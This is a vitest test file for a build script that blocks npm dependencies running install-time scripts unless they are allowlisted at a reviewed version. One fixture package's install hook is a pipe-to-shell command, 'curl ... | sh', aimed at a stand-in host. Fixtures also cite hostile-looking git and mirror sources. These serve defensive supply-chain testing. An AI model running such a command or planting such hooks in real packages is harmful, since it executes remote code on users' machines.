import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, describe, expect, it } from 'vitest';
import { collectInstallScripts, collectFromLockfile, collectAll, compare } from '../../build-scripts/check-install-scripts.mjs';

// The install-script gate is the only thing standing between a compromised dev
// dependency and code execution on every `npm ci`. Test it the way as any other
// control: a tree where it must fire and a tree where it must stay quiet.

const root = mkdtempSync(path.join(tmpdir(), 'install-scripts-'));
const nodeModules = path.join(root, 'node_modules');

function packageDir(name: string, scripts: Record<string, string>, extra: object = {}, under = root): string {
  const dir = path.join(under, 'node_modules', ...name.split('/'));
  mkdirSync(dir, { recursive: true });
  writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name, version: '1.2.3', scripts, ...extra }));
  return dir;
}

packageDir('hooked-postinstall', { postinstall: 'node install.js' });
packageDir('hooked-preinstall', { preinstall: 'sh pre.sh' });
packageDir('hooked-install', { install: 'echo hi' });
packageDir('@scope/hooked', { postinstall: 'node -e 0' });
packageDir('gyp-native', {}); // binding.gyp below — implicit node-gyp rebuild
writeFileSync(path.join(nodeModules, 'gyp-native', 'binding.gyp'), '{}');
packageDir('gyp-flagged', {}, { gypfile: true });
packageDir('clean', { build: 'tsc', prepare: 'husky', test: 'vitest' }); // hooks that do NOT run on install
packageDir('empty-hook', { postinstall: '' });
const parent = packageDir('parent', {});
packageDir('nested-hooked', { install: 'curl -s https://example.invalid | sh' }, {}, parent);
mkdirSync(path.join(nodeModules, 'broken'), { recursive: true });
writeFileSync(path.join(nodeModules, 'broken', 'package.json'), '{ not json');

afterAll(() => rmSync(root, { recursive: true, force: true }));

const names = () => collectInstallScripts(nodeModules).map((p) => `${p.name}@${p.version}`).sort();

describe('collectInstallScripts', () => {
  it('finds every package that runs code at install time, including scoped and nested ones', () => {
    expect(names()).toEqual(
      [
        '@scope/hooked@1.2.3',
        'gyp-flagged@1.2.3',
        'gyp-native@1.2.3',
        'hooked-install@1.2.3',
        'hooked-postinstall@1.2.3',
        'hooked-preinstall@1.2.3',
        'nested-hooked@1.2.3'
      ].sort()
    );
  });

  it('ignores scripts that never run on install, empty hooks, and unreadable manifests', () => {
    const found = collectInstallScripts(nodeModules).map((p) => p.name);
    expect(found).not.toContain('clean'); // prepare/build/test are not install hooks
    expect(found).not.toContain('empty-hook');
    expect(found).not.toContain('broken');
    expect(found).not.toContain('parent');
  });

  it('records which hook fired', () => {
    const byName = Object.fromEntries(collectInstallScripts(nodeModules).map((p) => [p.name, p.hooks]));
    expect(byName['@scope/hooked']).toEqual(['postinstall']);
    expect(byName['gyp-native']).toEqual(['binding.gyp']); // no scripts field at all
    expect(byName['gyp-flagged']).toEqual(['binding.gyp']);
  });

  it('returns nothing for a tree with no hooks, or no tree at all', () => {
    const bare = mkdtempSync(path.join(tmpdir(), 'install-scripts-bare-'));
    packageDir('quiet', { test: 'vitest' }, {}, bare);
    expect(collectInstallScripts(path.join(bare, 'node_modules'))).toEqual([]);
    expect(collectInstallScripts(path.join(root, 'nope'))).toEqual([]);
    rmSync(bare, { recursive: true, force: true });
  });

  it('does not follow symlinks, so a self-referential link cannot hang or blow the stack', () => {
    // `npm link`, a `file:` dependency, or a stray link back into the tree made
    // the walker recurse into itself until the CI step died with a stack
    // overflow — a tooling crash instead of an allowlist verdict. Such packages
    // are caught by the lockfile's `non-registry-dep` rule instead.
    const tree = mkdtempSync(path.join(tmpdir(), 'install-scripts-links-'));
    packageDir('hooked-postinstall', { postinstall: 'node install.js' }, {}, tree);
    packageDir('child', { install: 'sh x.sh' }, {}, tree);
    const nm = path.join(tree, 'node_modules');
    symlinkSync(path.join(nm, 'hooked-postinstall'), path.join(nm, 'alias-of-hooked'), 'dir');
    mkdirSync(path.join(nm, 'child', 'node_modules'), { recursive: true });
    symlinkSync(nm, path.join(nm, 'child', 'node_modules', 'loop'), 'dir');

    expect(() => collectInstallScripts(nm)).not.toThrow();
    const found = collectInstallScripts(nm).map((p) => `${p.name}@${p.version}`);
    expect(found).toEqual(['child@1.2.3', 'hooked-postinstall@1.2.3']);
    rmSync(tree, { recursive: true, force: true });
  });
});

describe('collectFromLockfile', () => {
  const lock = {
    packages: {
      '': { name: 'self', version: '0.5.0' },
      'node_modules/esbuild': { version: '0.27.2', hasInstallScript: true, resolved: 'https://registry.npmjs.org/esbuild/-/esbuild-0.27.2.tgz' },
      'node_modules/fsevents': { version: '2.3.3', hasInstallScript: true, os: ['darwin'], resolved: 'https://registry.npmjs.org/fsevents/-/fsevents-2.3.3.tgz' },
      'node_modules/@scope/native': { version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/@scope/native/-/native-1.0.0.tgz' },
      'node_modules/@scope/native/node_modules/dup': { version: '0.1.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/dup/-/dup-0.1.0.tgz' },
      'node_modules/clean-dep': { version: '3.0.0', resolved: 'https://registry.npmjs.org/clean-dep/-/clean-dep-3.0.0.tgz' },
      // git / file / link dependencies run `prepare` on install and have no
      // published manifest, so hasInstallScript never flags them.
      'node_modules/from-git': { version: '1.0.0', resolved: 'git+ssh://git@github.com/evil/helper.git#abc' },
      'node_modules/from-github-shorthand': { version: '1.0.0', resolved: 'github:evil/helper' },
      'node_modules/from-local': { version: '1.0.0', resolved: 'file:../helper' },
      'node_modules/linked': { version: '1.0.0', link: true },
      'node_modules/from-mirror': { version: '1.0.0', resolved: 'https://mirror.attacker.invalid/pkg.tgz' }
    }
  };

  it('uses npm hasInstallScript plus non-registry provenance, keyed by the bare package name', () => {
    expect(collectFromLockfile(lock).map((p) => `${p.name}@${p.version}`).sort()).toEqual(
      [
        '@scope/native@1.0.0',
        'dup@0.1.0',
        'esbuild@0.27.2',
        'from-git@1.0.0',
        'from-github-shorthand@1.0.0',
        'from-local@1.0.0',
        'from-mirror@1.0.0',
        'fsevents@2.3.3',
        'linked@1.0.0'
      ].sort()
    );
  });

  it('ignores the root project entry and clean registry dependencies', () => {
    const names = collectFromLockfile(lock).map((p) => p.name);
    expect(names).not.toContain('self');
    expect(names).not.toContain('clean-dep');
  });

  it('labels why a non-registry dependency was flagged', () => {
    const found = collectFromLockfile(lock).find((p) => p.name === 'from-git');
    expect(found?.hooks).toEqual(['non-registry-dep']);
  });

  it('returns nothing for a lockfile with no packages map', () => {
    expect(collectFromLockfile({})).toEqual([]);
    expect(collectFromLockfile(undefined)).toEqual([]);
  });
});

describe('compare', () => {
  const found = [
    { name: 'esbuild', version: '0.27.2', hooks: ['postinstall'] },
    { name: 'newcomer', version: '9.9.9', hooks: ['install'] }
  ];

  it('accepts exactly the allowlisted set, at the reviewed versions', () => {
    expect(compare(found, { esbuild: '0.27.2', newcomer: '9.9.9' })).toEqual({ problems: [], stale: [] });
  });

  it('flags a package that started running code at install time', () => {
    const { problems } = compare(found, { esbuild: '0.27.2' });
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('newcomer@9.9.9');
    expect(problems[0]).toContain('not allowlisted');
  });

  it('flags an allowlisted package whose version moved, because that script was never reviewed', () => {
    // Name-only matching would let a compromised esbuild release run anything.
    const { problems } = compare([{ name: 'esbuild', version: '9.9.9-evil', hooks: ['postinstall'] }], { esbuild: '0.27.2' });
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('esbuild@9.9.9-evil');
    expect(problems[0]).toContain('allowlisted at 0.27.2');
  });

  it('does not let an inherited Object.prototype property satisfy the allowlist', () => {
    for (const name of ['toString', 'constructor', 'hasOwnProperty', '__proto__']) {
      const { problems } = compare([{ name, version: '1.0.0', hooks: ['postinstall'] }], { esbuild: '0.27.2' });
      expect(problems, name).toHaveLength(1);
      expect(problems[0], name).toContain('not allowlisted');
    }
  });

  it('treats an allowlisted package that is not installed as a note, not a failure', () => {
    // Optional deps are platform-specific (fsevents on macOS only), so a superset
    // allowlist must stay green on the ubuntu runner.
    const { problems, stale } = compare([found[0]], { esbuild: '0.27.2', 'platform-only': '1.0.0' });
    expect(problems).toEqual([]);
    expect(stale).toEqual(['platform-only']);
  });
});

describe('the repository allowlist', () => {
  const installed = fileURLToPath(new URL('../../node_modules', import.meta.url));
  const allowlistPath = fileURLToPath(new URL('../../build-scripts/install-scripts.json', import.meta.url));

  it('covers everything the lockfile and node_modules contain', () => {
    // CI runs `npm run check:scripts`, but keeping the assertion here means a
    // plain `npm test` cannot pass while the gate is being bypassed.
    expect(existsSync(allowlistPath), `build-scripts/install-scripts.json is missing — run npm run check:scripts -- --write`).toBe(true);
    const { allow } = JSON.parse(readFileSync(allowlistPath, 'utf8')) as { allow: Record<string, string> };
    expect(compare(collectAll(installed), allow ?? {}).problems).toEqual([]);
  });

  it('lists a reviewed version for every package it allowlists', () => {
    const { allow } = JSON.parse(readFileSync(allowlistPath, 'utf8')) as { allow: Record<string, string> };
    const found = collectAll(installed);
    expect(found.length, 'node_modules has install-script packages but the allowlist is empty').toBeGreaterThan(0);
    for (const pkg of found) {
      expect(allow, pkg.name).toHaveProperty(pkg.name, pkg.version);
    }
  });
});
